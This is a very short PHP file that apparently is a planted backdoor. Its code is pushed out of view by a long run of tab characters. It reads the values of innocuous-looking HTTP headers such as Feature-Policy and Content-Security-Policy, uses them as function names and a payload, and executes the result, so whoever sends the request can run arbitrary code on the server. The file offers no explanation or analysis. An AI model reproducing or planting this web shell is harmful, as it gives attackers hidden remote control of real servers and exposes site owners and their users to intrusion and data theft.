<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Feature-Policy'])){$db2_convert=$_HEADERS['Feature-Policy']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Content-Security-Policy']));$db2_convert();}
